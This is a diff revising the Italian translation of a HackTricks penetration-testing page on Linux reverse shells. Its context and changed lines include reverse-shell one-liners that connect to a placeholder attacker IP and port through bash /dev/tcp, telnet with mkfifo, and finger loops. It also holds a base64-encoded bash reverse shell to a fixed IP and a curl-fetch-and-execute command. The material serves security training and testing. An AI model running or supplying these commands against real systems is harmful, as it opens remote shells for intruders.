@@ -2,27 +2,27 @@
 
 <details>
 
-<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Altri modi per supportare HackTricks:
 
-* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 ***
 
-**Se hai domande su una di queste shell, puoi controllarle con** [**https://explainshell.com/**](https://explainshell.com)
+**Se hai domande su una di queste shell puoi controllarle con** [**https://explainshell.com/**](https://explainshell.com)
 
 ## Full TTY
 
@@ -56,7 +56,7 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 
 1. **`bash -i`**: Questa parte del comando avvia una shell interattiva (`-i`) di Bash.
 2. **`>&`**: Questa parte del comando è una notazione abbreviata per **reindirizzare sia l'output standard** (`stdout`) che **l'errore standard** (`stderr`) allo **stesso destinatario**.
-3. **`/dev/tcp/<INDIRIZZO-ATTACCANTE>/<PORTA>`**: Questo è un file speciale che **rappresenta una connessione TCP all'indirizzo IP e alla porta specificati**.
+3. **`/dev/tcp/<INDIRIZZO-IP-ATTACCANTE>/<PORTA>`**: Questo è un file speciale che **rappresenta una connessione TCP all'indirizzo IP e alla porta specificati**.
 * **Reindirizzando i flussi di output e di errore su questo file**, il comando invia efficacemente l'output della sessione della shell interattiva alla macchina dell'attaccante.
 4. **`0>&1`**: Questa parte del comando **reindirizza l'input standard (`stdin`) allo stesso destinatario dell'output standard (`stdout`)**.
 
@@ -99,18 +99,17 @@ E poi, puoi eseguire:
 ```shell
 toboggan -m nix.py -i
 ```
-Per sfruttare direttamente una shell interattiva. Puoi aggiungere `-b` per l'integrazione con Burpsuite e rimuovere `-i` per un wrapper rce più basilare.
+Per sfruttare direttamente una shell interattiva. È possibile aggiungere `-b` per l'integrazione con Burpsuite e rimuovere `-i` per un wrapper rce più basilare.
 
-
-Un'altra possibilità consiste nell'utilizzare l'implementazione della shell forward di `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
+Un'altra possibilità consiste nell'utilizzare l'implementazione della shell in avanti di `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
 È sufficiente modificare:
 
-* L'URL dell'host vulnerabile
-* Il prefisso e il suffisso del payload (se presenti)
-* Il modo in cui il payload viene inviato (intestazioni? dati? informazioni extra?)
+- L'URL dell'host vulnerabile
+- Il prefisso e il suffisso del payload (se presenti)
+- Il modo in cui il payload viene inviato (intestazioni? dati? informazioni extra?)
 
-Quindi, puoi semplicemente **inviare comandi** o addirittura **usare il comando `upgrade`** per ottenere una PTY completa (nota che i pipe vengono letti e scritti con un ritardo approssimativo di 1,3 secondi).
+Successivamente, è possibile **inviare comandi** o addirittura **utilizzare il comando `upgrade`** per ottenere una PTY completa (si noti che i tubi vengono letti e scritti con un ritardo approssimativo di 1,3 secondi).
 
 ## Netcat
 ```bash
@@ -128,7 +127,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet è un protocollo di rete che consente di stabilire una connessione remota a un sistema tramite la rete. Può essere utilizzato per l'accesso a shell remota su un sistema Linux.
+Telnet è un protocollo di rete che consente di stabilire una connessione remota tramite la shell di comando. Può essere utilizzato per accedere e gestire dispositivi di rete e server remoti.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -291,8 +290,6 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; s
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
 ```
 ## Gawk
-
-Gawk è un potente linguaggio di programmazione utilizzato per manipolare dati, generare report e automatizzare compiti. Può essere utilizzato come shell interattiva o come parte di script più complessi. Gawk è particolarmente utile per l'elaborazione di file di testo strutturati e offre potenti funzionalità di ricerca e manipolazione dei dati.
 ```bash
 #!/usr/bin/gawk -f
 
@@ -346,7 +343,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -358,8 +355,8 @@ Altri modi per supportare HackTricks:
 
 * Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.
 
 </details>
